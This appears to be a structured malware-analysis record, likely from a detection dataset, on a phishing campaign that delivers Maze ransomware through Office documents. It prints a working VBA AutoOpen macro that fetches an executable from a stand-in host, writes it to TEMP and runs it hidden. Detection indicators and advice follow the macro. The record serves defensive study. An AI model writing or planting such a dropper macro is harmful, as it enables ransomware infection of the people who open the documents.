package_info.package_manager: N/A (delivered via email attachment, not a package manager)
package_info.why_malicious: The email campaign delivers weaponized Office documents containing malicious macros that, when enabled by the user, execute code to download and install the Maze ransomware, leading to data encryption and extortion.

execution_context.trigger: user interaction (macro enabled in Office document)
execution_context.file_location: malicious Office document (e.g., .doc, .xls) attached to phishing email

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objXML As Object
  Set objXML = CreateObject("MSXML2.XMLHTTP")
  objXML.Open "GET", "http://malicious-domain.com/payload.exe", False
  objXML.send
  If objXML.Status = 200 Then
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objXML.responseBody
    objStream.SaveToFile Environ("TEMP") & "\payload.exe", 2
    objStream.Close
    Shell Environ("TEMP") & "\payload.exe", vbHide
  End If
End Sub
malicious_snippets.code_behavior: When the user enables macros, the code downloads an executable from a remote server, saves it to the local TEMP directory, and executes it, resulting in the installation of Maze ransomware.

malice_analysis.why_suspicious: Macros in Office documents that download and execute binaries from the internet are a common malware delivery technique.
malice_analysis.violated_expectations: Normal Office documents should not contain macros that perform network operations or execute external binaries.
malice_analysis.similar_legitimate_use: Automated document processing in trusted enterprise environments may use macros, but never to download and run executables from untrusted sources.
key_indicators: AutoOpen macro triggers on document open
Use of MSXML2.XMLHTTP for network requests
Saving and executing a downloaded binary
No user notification or consent for execution

attack_chain.action: User receives phishing email with weaponized Office document attachment.
User is prompted to enable macros to view the content.
Malicious macro downloads and executes Maze ransomware payload.
attack_chain.leads_to: Ransomware encrypts files and displays ransom note.

behavioral_signatures: Office document macros making HTTP requests
Macros writing executable files to disk
Macros invoking Shell to execute binaries
file_indicators: Files written to %TEMP% directory with .exe extension
network_indicators: Outbound HTTP requests to suspicious or known malicious domains from Office processes
Download of executable payloads via MSXML2.XMLHTTP
detection_knowledge.how_to_detect: Monitor for Office documents with macros that perform network activity, especially those that download and execute files. Flag any Office process (e.g., WINWORD.EXE, EXCEL.EXE) that writes executable files to disk or spawns new processes. Use sandboxing to detonate suspicious attachments and observe for ransomware behaviors such as mass file encryption and ransom note creation.
